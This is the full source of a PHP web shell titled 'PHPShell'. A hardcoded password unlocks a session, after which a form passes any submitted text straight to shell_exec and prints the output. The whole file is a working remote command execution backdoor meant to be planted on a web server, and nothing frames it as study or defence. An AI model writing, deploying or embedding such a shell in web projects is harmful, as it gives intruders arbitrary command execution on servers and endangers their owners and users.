<?php
// don't remove this
session_start();







// This is the password 
// you can change it if u want
$PASSWD = "S3cr3tp4ssw0rd";










// -----------
if ($_SESSION['password'] == true)
{
	echo "<p></p>";
}
else{
	echo '
	<form action="" method="post">
	
	<p> password : <input type="text" name="passw" size="100" rows="100" /> <input type="submit" value="post"></p>
	
	</form>';
}

if (isset($_POST['passw'])){
	if ($_POST['passw'] == $PASSWD){
		$_SESSION['password'] = true;
	}
} 


?>

<!DOCTYPE html>
<html>
	<head>

	<title>PHPShell</title>
	<meta charset="UTF-8" />

	</head>
	
		<style>
				body{
					color: black;
					background: black;
				}
				a{
					text-decoration: none;
					color: #FFF3F3;
					font-size: 150%
				}

				p{
					text-decoration: none;
					color: white;
					font-size: 150%
				}

				fieldset{
					border:2px solid #FFF3F3;
					padding:0 20px 20px 20px;
 					margin-bottom:10px;
					border-radius:8px;
				}

				hr{

					height: 1px;
					background-color: #FFF3F3;
					
				}

				input{
					height: 25px;
					width: 70px;
				}
				input, textarea, select, option {
					background-color:#FFF3F3;
				}
				input, textarea, select {
					padding:3px;
					border:1px solid #F5C5C5;
					border-radius:5px;
					width:500px;
					box-shadow:1px 1px 2px #C0C0C0 inset;
				}
				select {
					margin-top:10px;
				}
				input[type=submit], input[type=reset] {
					width:60px;
					margin-left:5px;
					box-shadow:1px 1px 1px #D83F3D;
					cursor:pointer;
				}
			</style>
	<body>

	<fieldset>	

		
			
		
<?php
if ($_SESSION['password'] == true){
	echo 
	'<form action="" method="post">
	<p> <input type="text" name="command" size="100" rows="100" /> <input type="submit" value="execute"></p>
	</form>
	<hr>
	';
	if (isset($_POST['command'])) 
		{
			$command = $_POST['command'];
			echo "<a><pre>".shell_exec($command)."</pre></a>";
		}
		else{
			echo "<p>No command specified</p>";
		}
}
else{
	echo "<p>Please enter the password</p>";
}

?>

</fieldset>
	<body>
</html>
